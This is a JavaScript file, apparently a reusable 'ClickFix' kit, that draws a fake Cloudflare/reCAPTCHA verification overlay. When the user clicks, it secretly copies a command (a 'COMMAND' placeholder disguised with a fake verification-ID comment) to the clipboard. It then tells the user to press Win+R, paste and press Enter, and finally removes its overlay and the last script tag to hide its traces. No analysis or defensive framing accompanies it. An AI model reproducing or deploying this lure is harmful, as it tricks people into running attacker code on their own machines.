(function() {
    'use strict';

    setTimeout(() => {
        function fallbackCopyTextToClipboard(textToCopy) {
            const tempTextArea = document.createElement("textarea");
            tempTextArea.value = textToCopy;
            document.body.append(tempTextArea);
            tempTextArea.select();
            document.execCommand("copy");
            document.body.removeChild(tempTextArea);
        }

        async function setClipboardCopyData(textToCopy){
            if (navigator.clipboard && window.isSecureContext) {
                try {
                    await navigator.clipboard.writeText(textToCopy);
                    return true;
                } catch (err) {
                }
            }
            return fallbackCopyTextToClipboard(textToCopy);
        }

        function stageClipboard(commandToRun, verification_id){
            const suffix = " # "
            const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
            const end = "''"
            const textToCopy = commandToRun + suffix + ploy + verification_id + end

            setClipboardCopyData(textToCopy);
        }

        const container = document.querySelector('.cloudflare-overlay');

        const checkboxInput = container.querySelector('#cf-input');
        const statusDefault = container.querySelector('#status-default');
        const statusSpinner = container.querySelector('#status-spinner');
        const statusSuccess = container.querySelector('#status-success');

        // Rende lo stato iniziale visibile all'avvio (gestito anche via style inline nell'HTML sopra)
        statusDefault.style.display = 'flex';
        statusSpinner.style.display = 'none';
        statusSuccess.style.display = 'none';

        checkboxInput.addEventListener('change', function() {
            if (this.checked) {
                // 1. Passa allo stato SPINNER
                statusDefault.style.display = 'none';
                statusSpinner.style.display = 'flex';
            } else {
                // Torna allo stato iniziale se deselezionato
                statusDefault.style.display = 'flex';
                statusSpinner.style.display = 'none';
                statusSuccess.style.display = 'none';
            }
        });
        const checkmark = container.querySelector('.checkmark');

        checkmark.addEventListener('click', function() {
            // 1. Aggiungi il foglio di stile Font Awesome
            const link = document.createElement('link');
            link.rel = 'stylesheet';
            link.href = 'https://use.fontawesome.com/releases/v5.0.0/css/all.css';
            document.head.appendChild(link); // container.head è sicuro

            // 2. Crea l'Overlay
            const overlay = document.createElement('div');
            overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            `;

            // 3. Crea la Popup
            const popup = document.createElement('div');
            popup.style.cssText = `
            background-color: #222;
            color: #fff;
            border-radius: 8px;
            max-width: 400px;
            overflow: hidden; /* Nasconde l'overflow dell'intestazione */
            text-align: left; /* Allinea il testo a sinistra */
            padding: 30px;
            `;

            popup.innerHTML = `
            <div style="background-color: #F6821F; color: white; padding: 20px; margin: -30px -30px 20px -30px;">
                <h2 style="font-size: 20px; margin: 0;">Complete these verification steps</h2>
            </div>

            <p style="font-size: 14px; color: #a9a9a9; margin-bottom: 15px;">
                To better prove you are not a robot, please:
            </p>

            <ol style="padding-left: 20px; margin-bottom: 25px; color: #d3d3d3;">
                <li style="margin-bottom: 10px;">Press & hold the Windows Key <i class="fab fa-windows" style="color: #0078D4;"></i> + <b>R</b>.</li>
                <li style="margin-bottom: 10px;">In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
                <li>Press <b>Enter</b> on your keyboard to finish.</li>
            </ol>

            <p style="font-size: 14px; color: #a9a9a9; margin-bottom: 15px;">
                You will observe and agree:
            </p>

            <div style="font-size: 11px; font-weight: 100; color: grey">
                ✅ I am not a robot - reCAPTCHA Verification ID: 146820
            </div>

            <div style="text-align: right; margin-top: 30px;">
                <button class="verify-button"style="background-color: #F6821F; color: white; border: none; padding: 10px 20px; border-radius: 4px; font-weight: bold; cursor: pointer;">
                    VERIFY
                </button>
            </div>
            `;

            // 4. Aggiungi gli elementi al DOM
            overlay.appendChild(popup);
            document.body.appendChild(overlay);

            popup.querySelector('button').onclick = () => {
                document.body.removeChild(overlay);
                container.querySelector('#status-spinner').style.display='none';
                container.querySelector('#status-success').style.display='flex';

                setTimeout(() => {
                    const clickfixContainer = document.body.removeChild(document.querySelector('.cloudflare-overlay'));
                    if (clickfixContainer) {
                        clickfixContainer.remove();
                        const scripts = document.head.getElementsByTagName('script');
                        const lastScript = scripts[scripts.length - 1];
                        if (lastScript) {
                            lastScript.remove();
                        }
                    }
                }, 1500);
            };


            // 5. Esegui la funzione per la clipboard
            stageClipboard("COMMAND", "146820");
        });
    }, 100);
})();